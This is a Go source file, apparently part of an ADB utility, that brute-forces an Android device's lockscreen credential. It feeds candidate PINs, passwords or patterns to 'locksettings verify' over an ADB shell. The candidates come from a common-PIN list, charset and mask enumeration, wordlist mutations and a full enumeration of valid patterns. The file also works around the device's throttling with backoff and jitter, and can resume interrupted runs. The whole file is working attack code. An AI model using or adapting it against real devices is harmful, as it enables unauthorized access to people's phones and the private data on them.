package adb

import (
	"bufio"
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/dev-roba/adbgo/internal/config"
)

// BruteStatus classifies the outcome of a lockscreen credential check.
type BruteStatus int

const (
	BruteSuccess BruteStatus = iota
	BruteWrong
	BruteThrottled
	BruteUnsupported
)

// LockBruteConfig configures a lockscreen credential brute-force run.
type LockBruteConfig struct {
	Type         string
	MinLen       int
	MaxLen       int
	Charset      string
	Mask         string
	Wordlist     string
	CommonFirst  bool
	Delay        time.Duration
	Jitter       time.Duration
	MaxAttempts  int
	Resume       bool
}

// LockBruteStats carries live progress info for UI callbacks.
type LockBruteStats struct {
	Attempts   int
	Skipped    int
	Throttles  int
	Elapsed    time.Duration
	Current    string
	LastWait   time.Duration
	Throttling bool
}

// Rate returns attempts per second.
func (s LockBruteStats) Rate() float64 {
	if s.Elapsed <= 0 {
		return 0
	}
	return float64(s.Attempts) / s.Elapsed.Seconds()
}

// CheckLockVerifySupport reports whether the device's locksettings shell
// command supports credential verification (Android 10+). It does not
// consume a failed-attempt slot.
func CheckLockVerifySupport(serial string) bool {
	out, err := Run(serial, "shell", "locksettings")
	text := strings.ToLower(out)
	if err != nil {
		text += " " + strings.ToLower(err.Error())
	}
	return strings.Contains(text, "verify")
}

// VerifyLockCredential checks a candidate lockscreen credential via the
// framework's locksettings shell command. It returns the classification,
// an optional throttle wait hint and the raw device output. NOTE: every
// wrong candidate counts against the framework's failed-attempt counter.
func VerifyLockCredential(serial, cred string) (BruteStatus, time.Duration, string) {
	out, err := Run(serial, "shell", "locksettings", "verify", "--old", cred, "--user", "0")
	text := out
	if err != nil {
		if trimmed := strings.TrimSpace(out); trimmed != "" {
			text = trimmed + "\n"
		}
		text += err.Error()
	}
	low := strings.ToLower(text)
	switch {
	case strings.Contains(low, "unknown command"),
		strings.Contains(low, "bad argument"),
		strings.Contains(low, "usage:"),
		strings.Contains(low, "not found"),
		strings.Contains(low, "no lock"),
		strings.Contains(low, "don't have"):
		return BruteUnsupported, 0, text
	case strings.Contains(low, "verified"), strings.Contains(low, "success"):
		return BruteSuccess, 0, text
	case strings.Contains(low, "too many"),
		strings.Contains(low, "try again"),
		strings.Contains(low, "timeout"),
		strings.Contains(low, "throttl"),
		strings.Contains(low, "wait"):
		return BruteThrottled, parseWaitSeconds(low), text
	default:
		return BruteWrong, 0, text
	}
}

// parseWaitSeconds extracts a "N seconds" throttle hint from device output.
func parseWaitSeconds(low string) time.Duration {
	words := strings.Fields(low)
	for i, w := range words {
		w = strings.Trim(w, ",.!?;:")
		if n, err := strconv.Atoi(w); err == nil && n > 0 && i+1 < len(words) {
			next := strings.Trim(words[i+1], ",.!?;:")
			if next == "seconds" || next == "secs" || next == "sec" || next == "s" {
				return time.Duration(n) * time.Second
			}
		}
	}
	return 0
}

// candidateStream yields candidate credentials one at a time.
type candidateStream interface {
	Next() (string, bool)
}

func newCandidateStream(cfg LockBruteConfig) (candidateStream, error) {
	switch cfg.Type {
	case "pin":
		charset := cfg.Charset
		if charset == "" {
			charset = "0123456789"
		}
		base, err := newCharsetStream(charset, cfg.Mask, cfg.MinLen, cfg.MaxLen)
		if err != nil {
			return nil, err
		}
		if !cfg.CommonFirst {
			return base, nil
		}
		return &commonFirstStream{base: base, mask: cfg.Mask, minLen: cfg.MinLen, maxLen: cfg.MaxLen, seen: map[string]bool{}}, nil
	case "password":
		if cfg.Wordlist != "" {
			return newWordlistStream(cfg.Wordlist)
		}
		charset := cfg.Charset
		if charset == "" {
			charset = "abcdefghijklmnopqrstuvwxyz0123456789"
		}
		return newCharsetStream(charset, cfg.Mask, cfg.MinLen, cfg.MaxLen)
	case "pattern":
		return newPatternStream(cfg.MinLen, cfg.MaxLen), nil
	default:
		return nil, fmt.Errorf("unknown credential type %q (use pin, password or pattern)", cfg.Type)
	}
}

// charsetStream iterates charset combinations odometer-style, optionally
// constrained by a mask with '?' wildcards.
type charsetStream struct {
	charset []rune
	mask    []rune
	minLen  int
	maxLen  int
	length  int
	cur     []int
	started bool
	done    bool
}

func newCharsetStream(charset, mask string, minLen, maxLen int) (*charsetStream, error) {
	if charset == "" {
		return nil, fmt.Errorf("empty charset")
	}
	s := &charsetStream{charset: []rune(charset), mask: []rune(mask), minLen: minLen, maxLen: maxLen}
	if mask != "" {
		s.length = len([]rune(mask))
		if s.minLen <= 0 {
			s.minLen = s.length
		}
		if s.maxLen <= 0 || s.maxLen < s.length {
			s.maxLen = s.length
		}
		wild := 0
		for _, r := range s.mask {
			if r == '?' {
				wild++
			}
		}
		s.cur = make([]int, wild)
	} else {
		if s.minLen <= 0 {
			s.minLen = 1
		}
		if s.maxLen <= 0 || s.maxLen < s.minLen {
			s.maxLen = s.minLen
		}
		s.length = s.minLen
		s.cur = make([]int, s.length)
	}
	return s, nil
}

func (s *charsetStream) Next() (string, bool) {
	if s.done {
		return "", false
	}
	if !s.started {
		s.started = true
	} else if !s.advance() {
		return "", false
	}
	return s.render(), true
}

func (s *charsetStream) advance() bool {
	for i := len(s.cur) - 1; i >= 0; i-- {
		if s.cur[i] < len(s.charset)-1 {
			s.cur[i]++
			for j := i + 1; j < len(s.cur); j++ {
				s.cur[j] = 0
			}
			return true
		}
	}
	if len(s.mask) > 0 {
		return false
	}
	if s.length >= s.maxLen {
		return false
	}
	s.length++
	s.cur = make([]int, s.length)
	return true
}

func (s *charsetStream) render() string {
	var b strings.Builder
	if len(s.mask) > 0 {
		i := 0
		for _, r := range s.mask {
			if r == '?' {
				b.WriteRune(s.charset[s.cur[i]])
				i++
			} else {
				b.WriteRune(r)
			}
		}
		return b.String()
	}
	for _, idx := range s.cur {
		b.WriteRune(s.charset[idx])
	}
	return b.String()
}

// commonPINs lists frequently-used PINs in observed real-world order.
var commonPINs = []string{
	"1234", "1111", "0000", "1212", "7777", "1004", "2000", "4444", "2222", "6969",
	"9999", "3333", "5555", "6666", "1122", "1313", "8888", "4321", "2001", "1010",
	"123456", "1234567", "111111", "000000", "121212", "654321", "696969", "112233", "789456", "159753",
}

// commonFirstStream yields frequency-ordered common PINs first, then falls
// back to the full odometer without duplicates.
type commonFirstStream struct {
	base   candidateStream
	mask   string
	minLen int
	maxLen int
	idx    int
	seen   map[string]bool
}

func (c *commonFirstStream) matches(s string) bool {
	if c.mask != "" {
		m := []rune(c.mask)
		r := []rune(s)
		if len(r) != len(m) {
			return false
		}
		for i := range m {
			if m[i] != '?' && m[i] != r[i] {
				return false
			}
		}
		return true
	}
	return len(s) >= c.minLen && len(s) <= c.maxLen
}

func (c *commonFirstStream) Next() (string, bool) {
	for c.idx < len(commonPINs) {
		cand := commonPINs[c.idx]
		c.idx++
		if c.matches(cand) {
			c.seen[cand] = true
			return cand, true
		}
	}
	for {
		cand, ok := c.base.Next()
		if !ok {
			return "", false
		}
		if c.seen[cand] {
			continue
		}
		return cand, true
	}
}

// pwSuffixes are common password suffixes used for wordlist mutations.
var pwSuffixes = []string{"", "1", "12", "123", "1234", "!", "123!", "2024", "2025", "2026"}

// passwordVariants expands a wordlist entry with case and suffix mutations.
func passwordVariants(word string) []string {
	lw := strings.ToLower(word)
	cases := []string{word, lw, strings.ToUpper(lw)}
	if len(lw) > 0 {
		cases = append(cases, strings.ToUpper(lw[:1])+lw[1:])
	}
	seen := map[string]bool{}
	out := []string{}
	for _, c := range cases {
		for _, sfx := range pwSuffixes {
			v := c + sfx
			if !seen[v] {
				seen[v] = true
				out = append(out, v)
			}
		}
	}
	return out
}

// wordlistStream reads a wordlist line by line and expands each entry.
type wordlistStream struct {
	sc       *bufio.Scanner
	file     *os.File
	variants []string
	vi       int
}

func newWordlistStream(path string) (candidateStream, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, fmt.Errorf("cannot open wordlist: %w", err)
	}
	return &wordlistStream{sc: bufio.NewScanner(f), file: f}, nil
}

func (w *wordlistStream) Next() (string, bool) {
	for {
		if w.vi < len(w.variants) {
			v := w.variants[w.vi]
			w.vi++
			return v, true
		}
		if !w.sc.Scan() {
			w.file.Close()
			return "", false
		}
		base := strings.TrimSpace(w.sc.Text())
		if base == "" || strings.HasPrefix(base, "#") {
			continue
		}
		w.variants = passwordVariants(base)
		w.vi = 0
	}
}

// patternStream enumerates valid Android lockscreen patterns via DFS.
// Dots are numbered 1-9 row-major; a move is only legal when any dot it
// jumps over has already been visited (knight-like moves have no middle).
type patternStream struct {
	minLen int
	maxLen int
	stack  [][]int
}

func newPatternStream(minLen, maxLen int) *patternStream {
	if minLen < 1 {
		minLen = 3
	}
	if maxLen < minLen {
		maxLen = minLen
	}
	if maxLen > 9 {
		maxLen = 9
	}
	p := &patternStream{minLen: minLen, maxLen: maxLen}
	for c := 9; c >= 1; c-- {
		p.stack = append(p.stack, []int{c})
	}
	return p
}

func patternIntermediate(a, b int) int {
	if a > b {
		a, b = b, a
	}
	if a == 1 && b == 3 {
		return 2
	}
	if a == 4 && b == 6 {
		return 5
	}
	if a == 7 && b == 9 {
		return 8
	}
	if a == 1 && b == 7 {
		return 4
	}
	if a == 2 && b == 8 {
		return 5
	}
	if a == 3 && b == 9 {
		return 6
	}
	if a == 1 && b == 9 {
		return 5
	}
	if a == 3 && b == 7 {
		return 5
	}
	return 0
}

func patternContains(path []int, c int) bool {
	for _, p := range path {
		if p == c {
			return true
		}
	}
	return false
}

func patternValidNext(path []int, c int) bool {
	if patternContains(path, c) {
		return false
	}
	last := path[len(path)-1]
	if inter := patternIntermediate(last, c); inter != 0 && !patternContains(path, inter) {
		return false
	}
	return true
}

func (p *patternStream) Next() (string, bool) {
	for len(p.stack) > 0 {
		path := p.stack[len(p.stack)-1]
		p.stack = p.stack[:len(p.stack)-1]
		if len(path) < p.maxLen {
			for c := 9; c >= 1; c-- {
				if patternValidNext(path, c) {
					child := make([]int, len(path)+1)
					copy(child, path)
					child[len(path)] = c
					p.stack = append(p.stack, child)
				}
			}
		}
		if len(path) >= p.minLen {
			var b strings.Builder
			for _, c := range path {
				b.WriteString(strconv.Itoa(c))
			}
			return b.String(), true
		}
	}
	return "", false
}

// bruteSession persists already-tried candidates so long runs can resume.
type bruteSession struct {
	Serial    string    `json:"serial"`
	Type      string    `json:"type"`
	Tried     []string  `json:"tried"`
	Throttles int       `json:"throttles"`
	Started   time.Time `json:"started"`
}

func bruteSessionPath(serial, typ string) (string, error) {
	cfgPath, err := config.ConfigPath()
	if err != nil {
		return "", err
	}
	dir := filepath.Join(filepath.Dir(cfgPath), "bruteforce")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return "", err
	}
	return filepath.Join(dir, sanitize(serial)+"-"+typ+".json"), nil
}

// throttleBackoff returns an exponential wait after the framework starts
// throttling: 30s, 60s, 120s ... capped at 15 minutes.
func throttleBackoff(n int) time.Duration {
	if n < 1 {
		n = 1
	}
	d := 30 * time.Second
	for i := 1; i < n && d < 15*time.Minute; i++ {
		d *= 2
	}
	if d > 15*time.Minute {
		d = 15 * time.Minute
	}
	return d
}

func sleepInterruptible(d time.Duration, sigCh chan os.Signal) bool {
	if d <= 0 {
		return true
	}
	t := time.NewTimer(d)
	defer t.Stop()
	select {
	case <-t.C:
		return true
	case <-sigCh:
		return false
	}
}

// RunLockBruteforce iterates candidate lockscreen credentials, verifying
// each against the device. progress is called after every attempt;
// returning false aborts. On Ctrl+C the session is saved to
// ~/.config/adbgo/bruteforce/ and an error mentioning "session saved" is
// returned, so the caller can suggest resuming.
func RunLockBruteforce(serial string, cfg LockBruteConfig, progress func(LockBruteStats) bool) (string, error) {
	stream, err := newCandidateStream(cfg)
	if err != nil {
		return "", err
	}

	session := bruteSession{Serial: serial, Type: cfg.Type, Started: time.Now()}
	tried := make(map[string]bool)

	if cfg.Resume {
		if p, perr := bruteSessionPath(serial, cfg.Type); perr == nil {
			if data, rerr := os.ReadFile(p); rerr == nil {
				var prev bruteSession
				if json.Unmarshal(data, &prev) == nil {
					for _, c := range prev.Tried {
						tried[c] = true
					}
					session.Tried = append(session.Tried, prev.Tried...)
					session.Throttles = prev.Throttles
				}
			}
		}
	}

	savePath, saveErr := bruteSessionPath(serial, cfg.Type)
	save := func() {
		if saveErr != nil {
			return
		}
		data, merr := json.MarshalIndent(session, "", "  ")
		if merr != nil {
			return
		}
		_ = os.WriteFile(savePath, data, 0o600)
	}

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	defer signal.Stop(sigCh)

	stats := LockBruteStats{Throttles: session.Throttles}
	start := time.Now()

	interrupted := func() error {
		save()
		return fmt.Errorf("interrupted — session saved (%d candidates tried), resume later to continue", stats.Attempts)
	}

	for {
		select {
		case <-sigCh:
			return "", interrupted()
		default:
		}

		cand, ok := stream.Next()
		if !ok {
			save()
			return "", fmt.Errorf("search space exhausted — credential not found (%d tried)", stats.Attempts)
		}

		if tried[cand] {
			stats.Skipped++
			continue
		}
		tried[cand] = true
		session.Tried = append(session.Tried, cand)
		stats.Attempts++
		stats.Current = cand
		stats.Throttling = false

		throttleWait := time.Duration(0)
		status, wait, raw := VerifyLockCredential(serial, cand)
		switch status {
		case BruteSuccess:
			stats.Elapsed = time.Since(start)
			progress(stats)
			save()
			return cand, nil
		case BruteUnsupported:
			save()
			return "", fmt.Errorf("device no longer reports verification results: %s", strings.TrimSpace(raw))
		case BruteThrottled:
			stats.Throttles++
			session.Throttles = stats.Throttles
			stats.Throttling = true
			if wait <= 0 {
				wait = throttleBackoff(stats.Throttles)
			}
			stats.LastWait = wait
			throttleWait = wait + time.Second
		}

		stats.Elapsed = time.Since(start)
		if !progress(stats) {
			save()
			return "", fmt.Errorf("aborted at %d attempts — session saved, resume later to continue", stats.Attempts)
		}

		if throttleWait > 0 {
			save()
			if !sleepInterruptible(throttleWait, sigCh) {
				return "", interrupted()
			}
		}

		if cfg.MaxAttempts > 0 && stats.Attempts >= cfg.MaxAttempts {
			save()
			return "", fmt.Errorf("max attempts (%d) reached — session saved, resume later to continue", cfg.MaxAttempts)
		}

		delay := cfg.Delay
		if cfg.Jitter > 0 {
			delay += time.Duration(rand.Int63n(int64(cfg.Jitter) + 1))
		}
		if !sleepInterruptible(delay, sigCh) {
			return "", interrupted()
		}
	}
}
